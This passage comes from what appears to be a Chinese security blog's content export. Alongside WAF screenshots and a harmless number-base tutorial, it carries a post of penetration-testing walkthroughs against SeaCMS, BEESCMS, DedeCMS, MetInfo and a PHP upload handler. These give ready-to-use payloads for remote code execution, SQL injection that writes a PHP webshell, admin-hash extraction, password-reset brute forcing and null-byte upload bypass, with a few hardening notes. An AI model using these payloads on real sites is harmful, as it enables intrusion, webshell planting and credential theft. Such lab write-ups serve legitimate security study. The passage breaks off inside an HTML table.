铱讯WAF \n\n![](https://c.img.dasctf.com/images/2022317/1647484146142-96d394c2-765b-4ea5-94d2-fa88f631785a)\n\n## (24) 长亭SafeLine\n\n![](https://c.img.dasctf.com/images/2022317/1647484152044-8804fd76-fc60-4d1e-a23d-63298160c1fc)\n\n## (25) 安恒明御WAF \n\n![](https://c.img.dasctf.com/images/2022317/1647484156799-c4e77214-e986-4a4b-a954-66adfa92f600)\n\n## (26) F5 BIG-IP\n\n![](https://c.img.dasctf.com/images/2022317/1647484161988-6653b4ff-7a79-444e-9006-a215f9a3ef77)\n![](https://c.img.dasctf.com/images/2022317/1647484165969-618079f6-958d-425e-9988-043e9daf84d8)\n\n![](https://c.img.dasctf.com/images/2022317/1647484169592-de1574ac-c9a5-45f6-958c-7ac19847e48c)\n\n\n## (27) Mod_Security\n\n![](https://c.img.dasctf.com/images/2022317/1647484177277-da4ecb98-d8d7-4509-979b-9eb5309311a9)\n\n## (28) OpenRASP\n\n![](https://c.img.dasctf.com/images/2022317/1647484181295-52ebe63e-1b2e-4be6-9e4b-8dae7be89dde)\n\n## (29) dotDefender \n\n![](https://c.img.dasctf.com/images/2022317/1647484188436-027c830a-4d1a-4fda-88ef-f7932d7c58db)\n\n## (30) 未知云WAF\n\n![](https://c.img.dasctf.com/images/2022317/1647484192725-d2707cc8-f190-430d-bf0a-f10a9a840bed)","tags":["干货","转载"],"categories":["漏洞挖掘","转载"]},{"title":"计算机中的各种进制运算及转换","url":"/2022/03/15/20220315/","content":"\n# 前言\n\n因为有个小可爱搞不清楚各种进制，正好我自己是学计算机的，既能帮自己梳理下知识，同时也可以给各位搞不清楚或模糊的读者朋友们进行参考。\n\n学术有限，都是参考资料以及自己的一些见解而谈，有说错的地方可以指正！\n\n# 有哪些进制？\n\n常见的有二进制、八进制、十进制、十六进制等\n\n十进制就是我们平常看到的各种数字 运用于计算数学，\n\n二进制、八进制与十六进制则是运用于计算机之中，是计算机的语言\n\n八进制其实见到的也挺少的。\n\n提一嘴，其实每个进制的加减乘除和十进制都是很像的，十进制是我们平常看到的数字，也就是所谓的逢十进一，所以其他进制也是一样。比如十六进制就是逢16进1等等，可以举一反三。\n\n# 二进制\n\n二进制是以2为基数代表系统的二进位制(binary)\n\n特征：只有0和1 每一个数字被称为一个比特(bit) 8位一组（8bit比特 = 1bytes字节）范围是00000000(0) ~ 11111111(255)\n\n计算机中，我们所能看到的很多信息都是机器通过二进制机器码转换而成的。它们只认识0和1（只是一种代表，不真代表只有0和1 A和B也是可以的），计算机以不同的方式呈现给人们看，因为二进制0与1若要进行转换非常繁琐。\n\n## 计算\n\n### 加减乘除\n\n一般来说加法和减法见的比较多。\n\n加法：\n要注意[逢2进1] 跟十进制有点像。两个1相加则在下一个最高位+1\n\n举例：100111+11010=100001\n1 0 0 1 1 1\n1 1 0 1 0\n————————————\n1 0 0 0 0 0 1\n\n有四种情况： 0+0=0，0+1=1，1+0=1，1+1=10(0 进位为1)\n\n两者相加有1则为1 两个1则为10 其余都为0\n\n减法：\n有四种情况：0－0=0，1－0=1，1－1=0，0－1=1\n\n举例：1000001-11010=100111\n1 0 0 0 0 0 1\n1 1 0 1 0\n————————————\n0 1 0 0 1 1 1\n\n乘法：\n有四种情况： 0×0=0，1×0=0，0×1=0，1×1=1\n\n除法：\n有两种情况(除数只能为1)：0÷1=0，1÷1=1\n\n运算可以看如下图：\n![](https://c.img.dasctf.com/images/2022314/1647260004823-23b24b46-b1f9-459b-914e-dae491087cb8.webp)\n\n### 二进制 --> 八进制\n\n方法：取三合一法，即从二进制的小数点为分界点，向左（向右）每三位取成一位，接着将这三位二进制按权拼接，然后按顺序进行排列，小数点的位置不变，得到的数字就是我们所求的八进制数;\n\n    例：将二进制的11010111.0100111转换为八进制的步骤如下(从小数点开始往两边画,不足三位补0);\n    \n      1. 小数点前:\n    \n      111 = 7;\n    \n      010 = 2;\n    \n      11补全为011, 011 = 3;\n    \n      2. 小数点后:\n    \n      010 = 2;\n    \n      011 = 3;\n    \n      1补全为100，100 = 4;\n    \n    读数: 读数从高位到低位，即11010111.0100111=327.234\n![](http://cdn.anyiblog.top/common/1647340809916-b24e87ba-bdaa-43a8-9f8a-d46c35fa25a8.png)\n\n### 二进制 --> 十进制\n\n二进制转换成十进制 为了方便讲解就举个例子来说明：\n    \n    例：010110转为十进制\n\n\t0 1 0 1 1 0\n    \n    首先二进制8位一组，不足8位需要左边补0。看二进制从最右边看 以2为底数依次增加幂并乘以0或1 再把结果加在一起。\n    \n    所以这一个转为十进制先补0为\n    \n    0 0 0 1 0 1 1 0\n    \n    再进行运算\n    \n    0* 2^0(最右边的) + 1* 2^1 (右边前1位) + 1 * 2^2 (以此类推)+ 0 * 2^3 + 1 * 2^4 + 0 * 2^5 + 0 * 2^6 + 0 * 2^7\n    \n    = 0 + 2 + 4 + 0 + 16 + 0 + 0 + 0 \n    \n    = 22\n    \n    只用转换有1的位置 因为有0的会被乘为0\n\n### 二进制 --> 十六进制\n\n取四合一法，即从二进制的小数点为分界点，向左（向右）每四位取成一位，接着将这四位二进制按权相拼接，然后按顺序进行排列，小数点的位置不变，得到的数字就是我们所求的十六进制数;\n\n    例：11010111转为十六进制\n    \n    0111 = 7;\n    \n    1101 = D;\n    \n    读数: 读数从高位到低位，即11010111=D7\n\n# 十进制\n\n十进制就是我们平常看见的数字 有0，1，2，3， 4， 5， 6， 7， 8， 9十个基本数字组成。\n\n## 计算\n\n### 十进制 --> 二进制\n\n除2取余法，即每次将整数部分除以2，余数为该位权上的数，而商继续除以2，余数又为上一个位权上的数，这个步骤一直持续下去，直到商为0为止;\n\n读数: 从最后一个余数读起，一直到最前面的一个余数;\n\n    例：将十进制的(43)转换为二进制的步骤如下;\n    \n      1. 将商43除以2，商21余数为1;\n    \n      2. 将商21除以2，商10余数为1;\n    \n      3. 将商10除以2，商5余数为0;\n    \n      4. 将商5除以2，商2余数为1;\n    \n      5. 将商2除以2，商1余数为0; \n    \n      6. 将商1除以2，商0余数为1;\n    \n    读数: 因为最后一位是经过多次除以2才得到的，因此它是最高位，读数字从最后的余数向前读，101011，即(43)=(101011)\n\n![](http://cdn.anyiblog.top/common/1647262582348-aeae0e16-bc5b-4c43-8d4c-8fa975fe6a45.png)\n\n### 十进制 --> 八进制\n\n方法1：\n\n除8取余法，即每次将整数部分除以8，余数为该位权上的数，而商继续除以8，余数又为上一个位权上的数，这个步骤一直持续下去，直到商为0为止;\n\n读数: 从最后一个余数起，一直到最前面的一个余数;\n    \n    例：将十进制的796转换为八进制的步骤如下;\n    \n      1. 将商796除以8，商99余数为4;\n    \n      2. 将商99除以8，商12余数为3;\n    \n      4. 将商12除以8，商1余数为4;\n    \n      5. 将商1除以8，商0余数为1;\n    \n     读数: 因为最后一位是经过多次除以8才得到的，因此它是最高位，读数字从最后的余数向前读，1434，即796=1434\n\n![](http://cdn.anyiblog.top/common/1647340939857-bbdddd40-9829-49ee-883c-d92d65bac20a.png)\n\n方法2：\n\n先将十进制转换成二进制，然后将二进制又转换成八进制;\n\n![](http://cdn.anyiblog.top/common/1647340960606-108069cb-cd9d-4996-a144-6ed46fc2ae3d.png)\n\n### 十进制 --> 十六进制\n\n方法1：\n\n除16取余法，即每次将整数部分除以16，余数为该位权上的数，而商继续除以16，余数又为上一个位权上的数，这个步骤一直持续下去，直到商为0为止;\n\n读数: 从最后一个余数起，一直到最前面的一个余数;\n\n    例：十进制796转为十六进制\n    \n      1. 将商796除以16，商49余数为12，对应十六进制的C;\n    \n      2. 将商49除以16，商3余数为1;\n    \n      3. 将商3除以16，商0余数为3;\n    \n    读数: 因为最后一位是经过多次除以16才得到的，因此它是最高位，读数字从最后的余数向前读，31C，即 796=31C\n![](http://cdn.anyiblog.top/common/1647340044889-fe49589a-a06b-41b8-8c7f-80c6c7601762.png)\n\n方法2：\n先将十进制转换成二进制，然后将二进制又转换成十六进制;\n![](http://cdn.anyiblog.top/common/1647340050132-df9bfd33-5ddb-42f9-ad0b-167f3ec513d5.png)\n\n\n# 十六进制\n\n十六进制（简写为hex或下标16）是一种基数为16的计数系统，是一种逢16进1的进位制。\n\n十六进制可以更方便的表示二进制，计算机硬件是0101二进制的，16进制刚好是2的倍数，更容易表达一个命令或者数据\n\n同时，十六进制也可以表达颜色，4个16进制位可以表达好几百万的颜色\n\n特征：由数字0~9和字母A、B、C、D、E、F（a、b、c、d、e、f）表示，其中:A~F表示10~15 4个二进制可表达1个十六进制\n\n## 计算\n\n### 加减乘除\n\n加法和减法与十进制相同 逢16进1\n\n加法：\n\n200AD881\n00000050\n————————\n200AD8D1\n\n8+5 = 13 < 16 所以不用在下一位进1\n\n减法：\n\n其实大体与十进制相同，要注意字母的转换，借位\n\n51-40=11 C8-3A=8E FD-88=75\n\n乘法：\n\n逢16进1 与十进制相同\n\n![](http://cdn.anyiblog.top/common/1647327087880-cf1a3cef-0477-48b9-9647-6b4e4619bc81.jpg)\n\n除法：\n\n向高位借1，即借到“16”\n\n![](http://cdn.anyiblog.top/common/1647327132291-3b5fc96a-439e-4575-903b-94c4add2169b.jpg)\n\n### 十六进制 --> 二进制\n\n二进制和十六进制编码对应表\n\n    二进制(B)\t十六进制(O)\n    0000\t\t\t0\n    0001\t\t\t1\n    0010\t\t\t2\n    0011\t\t\t3\n    0100\t\t\t4\n    0101\t\t\t5\n    0110\t\t\t6\n    0111\t\t\t7\n    1000\t\t\t8\n    1001\t\t\t9\n    1010\t\t\tA\n    1011\t\t\tB\n    1100\t\t\tC\n    1101\t\t\tD\n    1110\t\t\tE\n    1111\t\t\tF\n\n取一分四法，即将一位十六进制数分解成四位二进制数，用四位二进制按权相加去凑这位十六进制数，小数点位置照旧;\n\n    例：0xDF 转为二进制\n    \n    D = 11 = 1101\n    \n    F = 15 = 1111\n    \n    DF = 11011111\n\n### 十六进制 --> 八进制\n\n方法：先将十六进制转换为二进制，然后再将二进制转换为八进制，小数点位置不变;\n\n    例：将十六进制的D7转换为八进制的步骤如下：\n    \n      1. 十六进制D7转换成二进制;\n    \n\t    D = 1101;\n\n\t\t7 = 0111;\n\n      2. 得到11010111, 再转换成八进制;\n    \n\t    111 = 7\n\t    \n\t    010 = 2\n\n\t\t11补0 为011 = 3\n    \n      读数: 读数从高位到低位，327，即D7=327\n\n### 十六进制 --> 十进制\n\n方法: 十六进制数从低位到高位（即从右往左）计算，第0位的权值是16的0次方，第1位的权值是16的1次方，第2位的权值是16的2次方，依次递增下去，把最后的结果相加的值就是十进制的值了;\n\n    例： 0x2B转为十进制\n    \n    第1位 B * 16^0 = 11;\n    \n    第2位 2 * 16^1 = 32;\n    \n    读数: 把结果值相加，11+32=43，即2B=43\n\n# 八进制\n\n八进制是一种以8为基数的计数法。一些编程语言中常常以数字0开始表明该数字是八进制。八进制的数和二进制数可以按位对应（八进制一位对应二进制三位），因此常应用在计算机语言中。\n\n实际上，由于十六进制一位可以对应4位二进制数字，用十六进制来表示二进制较为方便。因此，八进制的应用不如十六进制。有一些程序设计语言提供了使用八进制符号来表示数字的能力，而且还是有一些比较古老的Unix应用在使用八进制。\n\n特征：采用0~7八个数字 逢8进1。 八进制一位对应二进制三位。\n\n## 计算\n\n### 加减乘除\n\n与十进制的算法相同 只是逢8进1 \n\n加法：\n\n例：355 + 157 = 534\n\n355\n157\n———\n534\n\n5+7，为12大于8，所以结果为 4并且向前进一\n\n5+5，为10，再加上上一位进的一，11大于8，结果为 3并向前进 1\n\n3+1，再加上上一位进的一，结果为 4+1=5\n\n所以结果：355 + 157 = 534 \n\n减法：\n\n例如：534 - 157 = 355\n\n534\n157\n———\n355\n\n4-7，不够向前借一位加8，即为（4+8）-7，结果为 5\n\n3-5，因为3已经被借了一变为2，2-5不够再向前借一位加 8，即为 （2+8）-5，结果为 5\n\n5-1，5被借了一，即为4-1，结果为 3\n\n所以结果：534 - 157 = 355 \n\n乘法：\n\n例如：221 x 147\n\n 221\n 147\n———\n 1767\n 904\n221\n———\n35127\n\n所以结果 221 * 147 = 35127\n\n除法：\n\n如下图：（画图手写可太难了）\n![](http://cdn.anyiblog.top/common/1647344197668-13a3c4e5-e478-4255-9346-7b1128b0c4b3.jpg)\n\n### 八进制 --> 二进制\n\n二进制和八进制编码对应表\n\n    二进制(B)\t八进制(O)\n    000\t\t\t\t0\n    001\t\t\t\t1\n    010\t\t\t\t2\n    011\t\t\t\t3\n    100\t\t\t\t4\n    101\t\t\t\t5\n    110\t\t\t\t6\n    111\t\t\t\t7\n\n方法：\n取一分三法，即将一位八进制数分解成三位二进制数，用三位二进制按权相加去凑这位八进制数，小数点位置照旧\n\n![](http://cdn.anyiblog.top/common/1647344407708-93d9a111-c56e-4e79-b787-5533dad36b60.jpg)\n\n### 八进制 --> 十进制\n方法：\n八进制数从低位到高位（即从右往左）计算，第0位的权值是8的0次方，第1位的权值是8的1次方，第2位的权值是8的2次方，依次递增下去，把最后的结果相加的值就是十进制的值了\n\n      八进制就是逢8进1，八进制数采用 0～7这八数来表达一个数;\n      例：将八进制的53转换为十进制\n    \n      第1位 3 * 8^0 = 3;\n    \n      第2位 5 * 8^1 = 40;\n    \n      读数: 把结果值相加，3+40=43，即53=43\n\n### 八进制 --> 十六进制\n\n方法：\n先将八进制转换为二进制，然后再将二进制转换为十六进制，小数点位置不变\n\n    例：将八进制的327转换为十六进制的步骤如下：\n    \n      1. 八进制327转换成二进制;\n    \n   \t\t3 = 011;\n    \n    \t2 = 010;\n    \n    \t7 = 111;\n      2. 得到011010111, 再转换成十六进制;\n    \n\t    0111 = 7;\n\t    \n\t    1101 = D;\n    \n      读数: 读数从高位到低位，D7，即327=D7\n    \n\n","tags":["干货"],"categories":["干货"]},{"title":"CMS漏洞解析","url":"/2022/03/10/20220310/","content":"\n# P028-开源CMS实战渗透测试-海洋search.php注入\n\n  \n\n漏洞点： /seacms/search.php\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711677928-a7d70ad5-22ce-4a8d-bcd0-507e694c8a7c.jpg)\n  \n\n$content函数对各类搜索的传值进行了多次的替换，我们则可以利用它的替换原理来拼接一个完整的木马。\n\n  \n\n构造组合payload：  searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();\n\n  \n\n最后构成： if:eval(join($_POST[9]))\n\n  \n\nif的作用看：\n\n![](https://cdn.anyiblog.top/common/1648714220635-ff333b39-1646-4109-acb3-0f820bab6b5e.jpg)\n  \n\n经过分析发现，如果$content中含有“if:”的字符串，就调用eval()方法直接执行PHP函数，所以这就是我们在Payload中包含“if:”的原因。\n\n  \n\nRCE:\n\n![](https://cdn.anyiblog.top/common/1648714221589-39839a1d-8973-4d0e-b099-6d7cbcaebe78.jpg)\n  \n\n# P029-开源CMS实战渗透测试-BEESCMS注入\n\n  \n\n漏洞点： /beescms/admin\n\n  \n\n漏洞1-管理员账户绕过验证码暴力破解 弱口令\n\n  \n\n这里的验证码在不刷新页面的情况下，是可以无限尝试登录的，所以我们可以对密码进行爆破。\n\n![](https://cdn.anyiblog.top/common/1648711748324-4f44851c-a454-41fc-9ec2-e04f95af5b0f.jpg)\n  \n\n![](https://cdn.anyiblog.top/common/1648711752990-4130b7b5-9ae4-4306-8115-8ee4aabef67f.jpg)\n  \n\n弱口令：admin admin\n\n  \n\n漏洞2-管理员登录界面SQL注入\n\n  \n\nPayload：user=admin' uni union on selselectect 1,2,3,4,5 ''  in into  outoutfilefile 'c:/appserv/www/a.php' --%20\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711780740-06fe8948-cd63-4a2e-8d26-73e154205389.jpg)\n  \n\n访问a.php\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711784787-20b16610-86f0-4c28-b0a1-30fdc7839c76.jpg)\n  \n\n获得admin的密码为加密后的MD5值。\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711789767-67a87de0-32ef-47d0-b4c8-2fc2bcf20c23.jpg)\n  \n\n漏洞3-管理员登录页面写入一句话木马\n\n  \n\nPayload： user=admin' uni union on selselectect null,null,null,null,0x3c3f70687020406576616c28245f4745545b636d645d293b3f3e '' in into outoutfilefile 'c:/appserv/www/b.php' --%20\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711794603-27d6ab0e-d3b7-45bb-a829-b555fa88d85e.jpg)\n  \n\n这里的0x3c...是16进制，PHP会自动将其转换为字符串，而这段16进制转换后就是一句话木马：<?php @eval($_GET[cmd]);?>\n\n  \n\n访问b.php，并执行dir系统命令：\n\nhttp://172.16.1.200/b.php?cmd=system>('dir');\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711801020-dffd0390-3f8f-477d-8862-1d3bf9f43f00.jpg)\n  \n\n# P030-开源CMS实战渗透测试-DedeCMS flink.php友情链接注入\n\n  \n\n漏洞点： /dede/plus/flink.php\n\n  \n\n漏洞由两处文件造成\n\n  \n\nuploadsafe.inc.php\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711859504-de7bc62f-efc9-4290-8a1c-ceb9bea2399c.jpg)\n  \n\nURL参数中的_FILES[type][tmp_name]，$_key为type，$$_key即为$type，从而导致了$type变量的覆盖。\n\n  \n\n并将两个反斜杠转换为一个反斜杠\n\n  \n\nplus/flink.php\n\n  \n\n![](https://cdn.anyiblog.top/common/1648711868954-718c184b-7950-40ce-abff-6a01e1f43b65.jpg)\n  \n\nhtmlspecialchars(string,quotestyle,character-set)\n\n规定如何编码单引号和双引号。\n\nENT_COMPAT - 默认。仅编码双引号。\n\nENT_QUOTES - 编码双引号和单引号。\n\nENT_NOQUOTES - 不编码任何引号。\n\n默认情况下仅编码双引号，单引号未被编码。\n\n  \n\n访问DedeCMS页面，找到友情链接，点击“申请链接”的同时，使用攻击环境Kali Linux渗透测试平台中的Burpsuite工具进行监听\n\n  \n\n![](https://cdn.anyiblog.top/common/1648714141449-fdf1fa8a-ed99-4f54-a29d-de6b5f731933.jpg)\n  \n\n构造测试Payload：\n\n&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\n\n1、经过GPC后 webname 变为 pass，再经过uploadsafe.inc.php源代码中的转义，webname 变为 pass，插入到SQL语句中，就变成了下面的语句：\n\nINSERT INTO `#@__flink`(sortrank,url,webname,logo,msg,email,typeid,dtime,ischeck) VALUES('50','http://','pass','\n\n2、过滤掉后面的 ' ，从而实现绕过GPC。但是ExecuteNoneQuery不支持错误回显，需要我们就构造，完成数据回显。后面的logo函数就变成：\n\nlogo=,if(@`'`,0x7c,(select version())),1,1,1,1,1)#,@`'`\n\nischeck 为1即绕过审核，结果直接显示出来。\n\n  \n\n最终payload：\n\n查询版本信息\n\nSubmit=%20%E6%8F%90%20%E4%BA%A4%20&dopost=save&email=&logo=,if(@`'`,0x7c,(select version())),1,1,1,1,1)#,@`'`&typeid=1&url=http%3A%2F%2F&validate=****&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\n\n查询admin密码\n\nSubmit=%20%E6%8F%90%20%E4%BA%A4%20&dopost=save&email=&logo=,if(@`'`,0x7c,(select concat(userid,0x7c,pwd) from dede_admin limit 0,1)),1,1,1,1,1)#,@`'`&typeid=1&url=http%3A%2F%2F&validate=****&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\n\n（ 注意：其中验证码信息以****号代替，根据实际情况填写。）\n\n  \n\n![](https://cdn.anyiblog.top/common/1648714142984-827400c8-0a18-4e40-bd25-ecae15eeab4a.jpg)\n  \n\n多了链接 返回页面右键检查元素查看：\n\n  \n![](https://cdn.anyiblog.top/common/1648711938083-e5975d19-6cd9-436b-bbf9-2c43fd5b201e.jpg)\n得到版本号\n\n  \n\n同理获取管理员账号密码：\n\n![](https://cdn.anyiblog.top/common/1648711991800-c91e0dd1-c82b-4c96-9314-8730007c3063.jpg)\n使用somd5反查\n\n![](https://cdn.anyiblog.top/common/1648712004905-94badbe8-7c1c-4f9e-9613-4c925556b50d.jpg)\n得到密码admin\n\n  \n\n漏洞造成原因： 因为URL参数中的_FILES[type][tmp_name]，$_key为type，$$_key即为$type，从而导致了$type变量的覆盖，所以我们构造payload时只有单,经过GPC后补一个,再经过源代码中的转移会变成，以完成注入目的。\n\n  \n\n加固：此处加固，我们只需将转义为的语句删除即可。\n\n  \n\n![](https://cdn.anyiblog.top/common/1648714145880-5e0e45ee-d6cc-4209-accc-a87ef49eaa8c.jpg)\n  \n\n  \n\n# P031-开源CMS实战渗透测试-DedeCms recommend.php注入\n\n  \n\n漏洞处：/dede/plus/recommend.php?aid=1\"\n\n  \n\nPayload： /dede/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=%27%20or%20mid=@`%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`dede_admin`%20limit+0,1),5,6,7,8,9%23@`%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294\n\n  \n\n![](https://cdn.anyiblog.top/common/1648714152910-6a6a7db2-3bed-41ee-8d33-b5baeef25038.jpg)\n  \n\n在数据库中相当于执行了以下语句：\n\nmysql> SELECT s.*,t.* FROM\n\n    -> `dede_member_stow` AS s LEFT JOIN\n\n    -> `dede_member_stowtype` AS t ON s.type=t.stowname\n\n    -> WHERE s.aid='1'\n\n    -> ANDs.type=''or mid=@`'`/*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `dede_admin` limit 0,1),5,6,7,8,9#@`'` ';\n\n    -> ;\n\n+----+-----+-----+-----------------------------+---------+------+----------+-----------+----------+\n\n| id | mid | aid | title                       | addtime | type | stowname | indexname | indexurl |\n\n+----+-----+-----+-----------------------------+---------+------+----------+-----------+----------+\n\n|  1 |   2 |   3 | |admin|f297a57a5a743894a0e4 |       5 | 6    | 7        | 8         | 9        |\n\n+----+-----+-----+-----------------------------+---------+------+----------+-----------+----------+\n\n1 row in set (0.01 sec)\n\nmd5解密得到密码为admin\n\n漏洞产生的源文件plus/recommand.php\n\n![](https://cdn.anyiblog.top/common/1648712083844-8223fdc4-9c92-4959-9c87-d446a830150a.jpg)\n发现其中包含include/common.inc.php。\n\n![](https://cdn.anyiblog.top/common/1648712106343-02ac7d8d-fe81-4dfe-9c3c-e2e167e4aa01.jpg)\n  \n\n![](https://cdn.anyiblog.top/common/1648712106643-dde4a775-403f-40a9-865e-d42274396aad.jpg)\n  \n\n只要提交的URL中不包含cfg_|GLOBALS|_GET|_POST|_COOKIE，即可通过检查，_FILES[type][tmp_name]被带入。\n\n  \n\n142行源代码：\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712106887-3f8784c3-e7ab-4449-b3db-5c887431119c.jpg)\n  \n\n包含了include/uploadsafe.inc.php文件\n\n  \n\n与上题一样 该文件导致了变量覆盖\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712109801-74510dfe-60b3-4277-9c53-2bd535c065b7.jpg)\n  \n\n代码第29行，URL参数中的_FILES[type][tmp_name]，$_key为type，$$_key即为$type，从而导致了$type变量的覆盖。\n\n这样，我们之前构造的语句在执行数据库语句中，经过转化就变为下面的语句：\n\n?action=&aid=1&_FILES[type][tmp_name]=%27%20or%20mid=@`%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294\n\n加固：此处加固，我们只需将转义为的语句删除即可。\n\n  \n\n# P032-开源CMS实战渗透测试-MetInfo任意用户密码修改\n\n漏洞处：MetInfo/member/\n\n漏洞原因：点击找回密码，系统会随机生成12位密码，前8位为当天日期Ymd格式+后4位1000-9999随机生成四位数组合\n\n![](https://cdn.anyiblog.top/common/1648712115558-aea59ff7-f94b-4839-95c1-3f25fd73032d.jpg)\n因此设置字典爆破即可任意用户重置密码\n\n![](https://cdn.anyiblog.top/common/1648712117012-c21db626-7bd5-47e4-b82b-c8bc5fa705d1.jpg)\n![](https://cdn.anyiblog.top/common/1648712120328-e2db9610-1b36-4362-8428-516e6158aece.jpg)\n  \n\n加固： 随机生成12位密码，避免很容易的被暴力破解得到密码。这种情况下，若没有庞大的字典很难破解成功。我们可以看到如果破解12位数的密码，需要用的字典有13000GB。\n\n![](https://cdn.anyiblog.top/common/1648712124010-f853a388-da3b-4574-aea2-46b16666108e.jpg)\n![](https://cdn.anyiblog.top/common/1648712136495-8895e84e-6a06-4479-93d6-6a842394c673.jpg)\n或设置验证码以防爆破\n\n  \n\n# P033-开源CMS实战渗透测试-PHP截断利用\n\n漏洞处：index.php?s=member&c=account&m=avatar\n\n注册账号后登录用户中心\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712137352-c44f2f2d-fa4d-49e4-b314-3ace52fe60ed.jpg)\n上传头像处：\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712138012-c2393bf0-0731-4b1d-b468-35579bbefd58.jpg)\n分析代码：\n\n发现后缀名为白名单jpg、png、jpeg等文件\n\n![](https://cdn.anyiblog.top/common/1648712144241-9358bc30-5511-46f2-8b1f-ae57d1054283.jpg)\n  \n\nbp抓包 将后缀改为xxx.php%00.jpg 00截断 发送包成功上传\n\n![](https://cdn.anyiblog.top/common/1648712144671-468d70d8-79af-4a60-9fe1-acf75721d356.jpg)\n  \n\nRCE:\n\n![](https://cdn.anyiblog.top/common/1648712145984-8c56e885-ce48-4acb-bd9b-943d47565621.jpg)\n  \n\nPHP截断漏洞分析：\n\n在PHP中，iconv(4)函数在转换编码的时候，遇到不合法的字符串的时候会将其截断。\n\nPHP中，所有的字符都是二进制，PHP不识别任何编码，只是根据编码来显示内容。PHP中的chr()函数从指定的ASCII值返回字符。\n\n在iconv转码的过程中,utf->gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：$filename=”shell.php(hex).jpg”; (hex为0×80-0×99)，经过iconv转码后会变成$filename=”shell.php “;\n\n所以，经过iconv后$struct_file['name'])为shell.php，于是我们利用这个逻辑缺陷可以成功的上传shell.php(前提是上传的文件名为shell.php.jpg )。\n\n修复代码：\n  \n\n<table style=\"border-collapse: collapse; min-width: 100%;\"><colgroup><col style=\"width: 414px;\"></colgroup><tbody style=\"box-sizing: border-box;\"><tr style=\"box-sizing: border-box;\"><td style=\"box-sizing: border-box; vertical-align: top; width: 414px; padding: 8px; border: 1px solid;\"><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (Z_LVAL(opline-&gt;op2.u.constant) != ZEND_EVAL &amp;&amp; strlen(Z_STRVAL_P(inc_filename)) != Z_STRLEN_P(inc_filename)) {</span></div><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;\">if (Z_LVAL(opline-&gt;op2.u.constant)==ZEND_INCLUDE_ONCE || Z_LVAL(opline-&gt;op2.u.constant)==ZEND_INCLUDE) {</span></div><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;\">zend_message_dispatcher(ZMSG_FAILED_INCLUDE_FOPEN, Z_STRVAL_P(inc_filename) TSRMLS_CC);</span></div><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;\">} else {</span></div><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;\">zend_message_dispatcher(ZMSG_FAILED_REQUIRE_FOPEN, Z_STRVAL_P(inc_filename) TSRMLS_CC);</span></div><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;\">}</span></div><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;\">}</span></div></td></tr></tbody></table>\n\n<table style=\"border-collapse: collapse; min-width: 100%;\"><colgroup><col style=\"width: 414px;\"></colgroup><tbody style=\"box-sizing: border-box;\"><tr style=\"box-sizing: border-box;\"><td style=\"box-sizing: border-box; vertical-align: top; width: 414px; padding: 8px; border: 1px solid;\"><div style=\"box-sizing: border-box; margin: 0px 0px 12px; background-color: rgb(255, 255, 255); font-size: 14px;\"><span style=\"box-sizing: border-box; font-size: 14px; color: rgb(51, 51, 51); font-family: 微软雅黑; 